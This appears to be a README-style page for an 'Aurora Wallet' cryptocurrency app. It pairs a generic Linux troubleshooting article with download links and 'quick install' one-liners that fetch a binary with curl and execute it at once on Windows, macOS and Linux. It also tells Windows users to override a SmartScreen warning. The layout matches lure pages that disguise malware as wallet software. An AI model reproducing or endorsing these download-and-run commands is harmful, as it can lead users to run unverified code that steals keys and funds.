![Aurora Wallet Linux permissions guide](assets/aurora-wallet-guide-article-banner.png)

# Aurora Wallet Linux permissions and launch errors

Permission denied, a missing library or a silent exit after extraction: three fixes in order.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


A Linux wallet that will not start after extraction is usually missing the executable bit, a library or both.

The archive ships a binary rather than a package, so nothing sets permissions for you. Some extraction tools drop the execute bit, and minimal installations lack one of the desktop libraries the binary links against. Both problems produce a wallet that appears to do nothing.

<!-- ARTICLE-BODY-BEGIN -->

## The executable bit

Open a terminal in the folder you extracted and run `chmod +x aurora-wallet`. Start the wallet with `./aurora-wallet` from the same folder so the resources next to the binary stay reachable.

A desktop entry that points at a moved binary produces the same silent failure. Update the `Exec=` line to the new path when you relocate the folder.

## Missing libraries

Start the wallet from a terminal to read the loader message. A missing Qt or desktop library names itself in that output, and your distribution's package manager provides the runtime package that matches it.

Install runtime packages rather than development packages. The wallet needs the libraries the desktop already uses, not a compiler toolchain.

## Work through launch failures in order

1. Run the binary from a terminal and read the first error line.
2. Apply `chmod +x` if the error mentions permission.
3. Install the named library with your distribution's package manager.
4. Check free disk space, since a full disk stops the chain database from opening.
5. Start the wallet as your normal user, never with elevated privileges.
6. Rebuild the chain folders if the database is the reported failure.

Running a wallet with elevated privileges gives every process on the machine access to your keys, which is the opposite of what a self-custody wallet is for.

## After the window opens

The wallet asks where to keep its data on the first run, with `~/.auroracoin` as the default. That folder holds both the wallet file and the chain, which is why <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/21-wallet-dat-location.md">finding the wallet.dat file</a> starts here on Linux.

The <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/05-install-linux.md">Linux install walkthrough</a> repeats the extraction steps with the exact archive name, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/14-crash-on-launch.md">crash on launch</a> covers the cases where the binary starts and the window disappears.

Build the wallet from the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> archive, so the binary and the resources come from the same version.

## FAQ

### Can I install it system-wide?

Yes, by copying the folder to `/opt` and pointing a desktop entry at it. The wallet data should stay in your home directory.

### Why does the GUI method lose the executable bit?

Some archive managers do not preserve Unix permissions. One `chmod +x` fixes it permanently.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [Install on Linux](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/05-install-linux.md)
- [wallet.dat location](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/21-wallet-dat-location.md)
- [Crash on launch](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/14-crash-on-launch.md)
- [Verify SHA-256 checksums](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/06-verify-sha256-checksums.md)
